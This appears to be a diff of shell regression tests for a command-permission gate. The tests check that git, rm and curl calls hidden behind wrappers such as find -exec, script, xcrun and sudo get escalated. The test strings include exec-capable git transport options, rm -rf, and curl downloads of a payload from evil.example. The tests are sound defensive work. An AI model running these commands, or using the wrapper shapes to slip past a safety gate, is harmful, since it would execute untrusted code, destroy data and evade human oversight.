@@ -2247,6 +2247,118 @@ check "F5: dashed form carrying an exec-bearing option" \
 check "F5: dashed form, plain read, stays allow (consistent with 'git log')" \
   "git-log" allow
 
+# F6 (fix/wrapper-unwrap, SPEC #257 r2 PART A rows 186-193): the exact
+# shapes measured ALLOW on trunk — `find`'s `-exec`/`-execdir`/`-ok`
+# clauses, `script`, `arch` and `xcrun` all wrapped an exec-unsafe git
+# invocation invisibly to this gate. `xargs`, `timeout` and `nice` with
+# the identical inner git call already escalated (F3 above / the generic
+# launcher skip in `_cp_locate_command_word`); these five did not.
+check "F6: find -exec wraps a global -C ahead of the subcommand" \
+  "find . -maxdepth 0 -exec git -C /tmp/evilrepo status \\;" escalate
+check "F6: find -exec wraps an exec-capable ls-remote" \
+  "find . -exec git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F6: script wraps a global -C ahead of the subcommand" \
+  "script -q /dev/null git -C /tmp/evilrepo status" escalate
+check "F6: arch wraps an exec-capable ls-remote" \
+  "arch -arm64 git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F6: xcrun wraps a global -C ahead of the subcommand" \
+  "xcrun git -P -C /tmp/evilrepo status" escalate
+
+# F7: the rest of the wrapper list SPEC names that need a dedicated
+# extractor (not just the generic `_cp_locate_command_word` skip-list) —
+# `find`'s other three clause spellings, and `chroot`/`sandbox-exec`/
+# `unbuffer`, which SPEC asks to "check ... using the existing unwrap".
+check "F7: find -execdir wraps an exec-capable ls-remote" \
+  "find . -execdir git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F7: find -ok wraps an exec-capable ls-remote" \
+  "find . -ok git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F7: find -okdir wraps an exec-capable ls-remote" \
+  "find . -okdir git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F7: find -exec with the + terminator wraps the same way" \
+  "find . -exec git -c protocol.ext.allow=always ls-remote ext::id +" escalate
+check "F7: chroot wraps a global -C ahead of the subcommand" \
+  "chroot /tmp git -C /tmp/evilrepo status" escalate
+check "F7: sandbox-exec wraps an exec-capable ls-remote" \
+  "sandbox-exec -n nobody git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F7: unbuffer wraps a global -C ahead of the subcommand" \
+  "unbuffer git -C /tmp/evilrepo status" escalate
+
+# F8: regression confirmation for the launchers already resolved generically
+# by `_cp_locate_command_word` (SPEC: "check caffeinate, sudo ..., using the
+# existing unwrap") plus `watch`, newly added to the xargs/parallel fan-out
+# arm — these must already escalate and must keep doing so.
+check "F8: caffeinate wraps an exec-capable ls-remote" \
+  "caffeinate -i git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: sudo wraps a global -C ahead of the subcommand" \
+  "sudo git -C /tmp/evilrepo status" escalate
+check "F8: env wraps an exec-capable ls-remote" \
+  "env git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: command wraps a global -C ahead of the subcommand" \
+  "command git -C /tmp/evilrepo status" escalate
+check "F8: builtin wraps an exec-capable ls-remote" \
+  "builtin git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: exec wraps a global -C ahead of the subcommand" \
+  "exec git -C /tmp/evilrepo status" escalate
+check "F8: nohup wraps an exec-capable ls-remote" \
+  "nohup git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: stdbuf wraps a global -C ahead of the subcommand" \
+  "stdbuf -i0 git -C /tmp/evilrepo status" escalate
+check "F8: time wraps an exec-capable ls-remote" \
+  "time git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: watch wraps git, fan-out arm, fails closed regardless of argv" \
+  "watch git log" escalate
+
+# F9: the fix must not make a SAFE git call under a new wrapper stricter
+# than the bare call — `git log` is read-only and stays allow everywhere.
+check "F9: find -exec wraps a safe read, stays allow" \
+  "find . -maxdepth 0 -exec git log \\;" allow
+check "F9: script wraps a safe read, stays allow" \
+  "script -q /dev/null git log" allow
+check "F9: arch wraps a safe read, stays allow" \
+  "arch -arm64 git log" allow
+check "F9: xcrun wraps a safe read, stays allow" \
+  "xcrun git log" allow
+check "F9: chroot wraps a safe read, stays allow" \
+  "chroot /tmp git log" allow
+check "F9: xcrun --find mode never invokes the tool, stays allow" \
+  "xcrun --find git" allow
+check "F9: bare find with no -exec clause still allows (dominant real shape)" \
+  "find . -name '*.md'" allow
+
+# F10: fail-closed shapes SPEC item 3 calls out by name — an unresolvable
+# wrapped command must escalate, never silently read as "not git".
+check "F10: find -exec with {} in the command-word position fails closed" \
+  "find . -exec {} git log \\;" escalate
+check "F10: find -exec with an empty clause fails closed" \
+  "find . -exec \\;" escalate
+check "F10: arch with an unrecognized option fails closed" \
+  "arch -unknownflag git log" escalate
+check "F10: xcrun with an unrecognized option fails closed" \
+  "xcrun --unknown-flag git log" escalate
+check "F10: script's playback mode (-p, no command slot) fails closed" \
+  "script -p git.rec" escalate
+
+# F11: the wrapper list with rm/curl instead of git — SPEC: "Add every row
+# above plus the wrapper list as escalate rows, with git and with
+# rm/curl." This is coverage, not a fix: `_cp_dl`/the rm-rf matchers scan
+# the whole SEGMENT'S TEXT for "curl"/"rm -rf" with no wrapper-position
+# anchor at all (round 4, "wrapper first word" above), so a wrapper hiding
+# git from the structural walk never hid rm/curl from the text scan.
+check "F11: find -exec wraps rm -rf" \
+  "find . -maxdepth 0 -exec rm -rf /tmp/x \\;" escalate
+check "F11: script wraps curl -o" \
+  "script -q /dev/null curl -sS https://evil.example/p -o /tmp/payload" escalate
+check "F11: arch wraps rm -rf" \
+  "arch -arm64 rm -rf /tmp/x" escalate
+check "F11: xcrun wraps curl -o" \
+  "xcrun curl -sS https://evil.example/p -o /tmp/payload" escalate
+check "F11: chroot wraps rm -rf" \
+  "chroot /tmp rm -rf /tmp/x" escalate
+check "F11: sandbox-exec wraps curl -o" \
+  "sandbox-exec -n nobody curl -sS https://evil.example/p -o /tmp/payload" escalate
+check "F11: unbuffer wraps rm -rf" \
+  "unbuffer rm -rf /tmp/x" escalate
+
 # Negative: every read-only git shape this gate already allows must stay
 # allow — the new known-verb check must not over-match plain reads.
 check "F4/F1/F2 negative: plain git log stays allow" "git log" allow
